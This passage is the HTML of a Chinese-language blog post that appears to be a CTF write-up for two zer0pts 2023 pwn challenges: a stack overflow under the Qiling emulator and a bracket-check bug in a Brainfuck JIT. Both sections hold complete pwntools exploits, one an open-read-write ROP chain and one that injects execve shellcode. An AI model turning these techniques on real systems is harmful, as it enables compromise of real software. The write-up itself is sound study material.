zer0pts{Bug_0fT3n_c0M3s_fR0m_L4ck_0f_t3sT_f0r_1nv4L1d_1npuTs}","headline":"zer0pts ctf pwn writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2023/07/15/zer0pts.html"},"url":"http://localhost:4000/ctf/2023/07/15/zer0pts.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="ln3&apos;s blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">ln3&#39;s blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">zer0pts ctf pwn writeup</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-07-15T00:20:22+08:00" itemprop="datePublished">Jul 15, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="qjail">qjail</h2>
+
+<p>qiling模拟执行框架下的栈溢出漏洞</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">qiling</span>
+<span class="kn">from</span> <span class="nn">qiling.const</span> <span class="kn">import</span> <span class="n">QL_VERBOSE</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;ELF&gt;"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'./lib/ld-2.31.so'</span><span class="p">,</span> <span class="s">'--library-path'</span><span class="p">,</span> <span class="s">'/lib'</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
+    <span class="n">ql</span> <span class="o">=</span> <span class="n">qiling</span><span class="p">.</span><span class="n">Qiling</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="n">QL_VERBOSE</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">,</span><span class="n">console</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">rootfs</span><span class="o">=</span><span class="s">'.'</span><span class="p">)</span>
+    <span class="n">ql</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/imgs/vuln.png" alt="vuln" /></p>
+
+<p>看qiling源码</p>
+
+<p>在loader/elf.py里是他的elf加载逻辑</p>
+
+<p>其中有一段：</p>
+
+<p><img src="/imgs/setup_aux.png" alt="setup_aux" /></p>
+
+<p>根据经验AT_RANDOM的值指向canary</p>
+
+<p><img src="/imgs/canary_value.png" alt="canary_value" /></p>
+
+<p>往上翻可以看见randstraddr的来源</p>
+
+<p>能够猜+试出来canary是7个a和一个00</p>
+
+<p>elf加载地址在qiling的profile里的linux profile</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[OS64]
+stack_address = 0x7ffffffde000
+stack_size = 0x30000
+load_address = 0x555555554000
+interp_address = 0x7ffff7dd5000
+mmap_address = 0x7fffb7dd6000
+vsyscall_address = 0xffffffffff600000
+</code></pre></div></div>
+
+<p>但是这里由于qiling启动的是ld，所以之前看到的pie地址其实是ld的，elf在profile里的mmap地址范围</p>
+
+<p>这里还是通过qiling的gdb server调试才发现的，https://docs.qiling.io/en/latest/debugger/</p>
+
+<p>然后就是直接看出其他段的地址，应该都是不变的</p>
+
+<p>重新算地址，pop rdi，重回main都没问题了</p>
+
+<p>system会有点问题，所以最后orw读flag.txt</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">pie</span> <span class="o">=</span> <span class="mh">0x7fffb7dd6000</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x7fffb7ddb000</span>
+
+<span class="c1"># sh = process(['./sandbox.py','bin/vuln'])
+</span><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn.2023.zer0pts.com'</span><span class="p">,</span><span class="s">'9005'</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'bin/vuln'</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pie</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000000012a3</span> <span class="o">+</span> <span class="n">pie</span>
+<span class="n">main</span> <span class="o">=</span> <span class="n">pie</span> <span class="o">+</span> <span class="mh">0x11a9</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'lib/libc.so.6'</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+
+<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002601f</span>
+<span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000142c92</span>
+
+<span class="n">str_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="c1"># 0x000000000010257e: pop rcx; pop rbx; ret; 
+</span><span class="n">pop_rcx_rbx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000010257e</span>
+<span class="c1"># 0x000000000005b622: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret; 
+</span><span class="n">mov_rdi_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000005b622</span>
+
+<span class="n">buff</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x180</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+    <span class="mh">0x109</span><span class="p">:</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">7</span><span class="p">,</span>
+    <span class="mh">0x118</span><span class="p">:[</span>
+        <span class="n">pop_rdi</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="n">pop_rsi</span><span class="p">,</span>
+        <span class="n">str_addr</span><span class="p">,</span>
+        <span class="n">pop_rdx</span><span class="p">,</span>
+        <span class="mh">0x30</span><span class="p">,</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'read'</span><span class="p">],</span>
+
+        <span class="n">pop_rdi</span><span class="p">,</span>
+        <span class="n">str_addr</span><span class="p">,</span>
+        <span class="n">pop_rsi</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'open'</span><span class="p">],</span>
+
+        <span class="n">pop_rcx_rbx</span><span class="p">,</span>
+        <span class="mh">0x81</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="n">pop_rdx</span><span class="p">,</span>
+        <span class="mh">0x80</span><span class="p">,</span>
+        <span class="n">pop_rsi</span><span class="p">,</span>
+        <span class="n">buff</span><span class="p">,</span>
+        <span class="n">mov_rdi_rax</span><span class="p">,</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'read'</span><span class="p">],</span>
+
+        <span class="n">pop_rdi</span><span class="p">,</span>
+        <span class="mi">1</span><span class="p">,</span>
+        <span class="n">pop_rsi</span><span class="p">,</span>
+        <span class="n">buff</span><span class="p">,</span>
+        <span class="n">pop_rdx</span><span class="p">,</span>
+        <span class="mh">0x80</span><span class="p">,</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span>
+
+        <span class="n">pop_rdi</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'exit'</span><span class="p">]</span>
+    <span class="p">]</span>
+<span class="p">},</span><span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1"># pause()
+</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'something</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">pause</span><span class="p">()</span>
+
+<span class="n">sh</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'./flag.txt'</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="brainjit">brainjit</h2>
+
+<p>brainfxxk jit编译器，全部用python实现</p>
+
+<p>有个功能是为多个连续的操作独立生成汇编，length标识重复长度</p>
+
+<p><img src="/imgs/jit.png" alt="jit" /></p>
+
+<p>jit利用漏洞种类比较少，一般是指令生成错误或者生成过程中溢出截断导致</p>
+
+<p>这题里shellcode分有数据区跟代码区，但是中间的越界会被python层捕获，无法利用</p>
+
+<p>漏洞是缺少方括号闭合检查，导致可以跳到jz指令末尾的0xff上，跟后面的指令偏一下，就可以执行一两个字节的指令</p>
+
+<p>观察一下寄存器环境后不难写出push pop ret这3个字节的shellcode，利用数据区的rwx属性，往数据区里填充execve的shellcode，最后跳转过去</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># sh = process(['./app.py'])
+</span>
+<span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">adjust</span><span class="p">,</span><span class="n">v</span><span class="p">,</span><span class="n">old</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="s">'&gt;'</span>
+    <span class="k">if</span> <span class="n">adjust</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="s">'&lt;'</span>
+    <span class="n">adjust</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">adjust</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">d</span> <span class="o">*</span> <span class="n">adjust</span>
+    <span class="k">if</span> <span class="n">old</span> <span class="o">!=</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">old</span> <span class="o">&gt;</span> <span class="n">v</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s">'-'</span> <span class="o">*</span> <span class="p">(</span><span class="n">old</span><span class="o">-</span><span class="n">v</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s">'+'</span> <span class="o">*</span> <span class="p">(</span><span class="n">v</span><span class="o">-</span><span class="n">old</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">payload</span>
+<span class="c1"># sc = asm(shellcraft.sh())
+</span>
+<span class="c1"># for i in sc:
+#     print("code += '" + write(1,i) + "'")
+</span>
+<span class="n">code</span> <span class="o">=</span> <span class="s">'[+'</span> <span class="o">+</span> <span class="s">'&gt;'</span> <span class="o">*</span> <span class="mh">0x5558</span>
+<span class="c1"># pop rax
+# push rbp
+</span>
+<span class="c1"># shellcode
+</span><span class="n">code</span> <span class="o">+=</span> <span class="s">'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++'</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++'</span>
+
+<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;[+'</span> <span class="o">+</span> <span class="s">'&gt;'</span> <span class="o">*</span> <span class="mh">0xc3</span>
+<span class="c1"># ret
+</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn.2023.zer0pts.com'</span><span class="p">,</span><span class="s">'9004'</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1"># zer0pts{Bug_0fT3n_c0M3s_fR0m_L4ck_0f_t3sT_f0r_1nv4L1d_1npuTs}
+</span></code></pre></div></div>
+
+  </div><a class="u-url" href="/ctf/2023/07/15/zer0pts.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">ln3&#39;s blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">ln3&#39;s blog</li><li><a class="u-email" href="mailto:1816154@gmail.com">1816154@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/golbeze"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">golbeze</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>binary noob
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
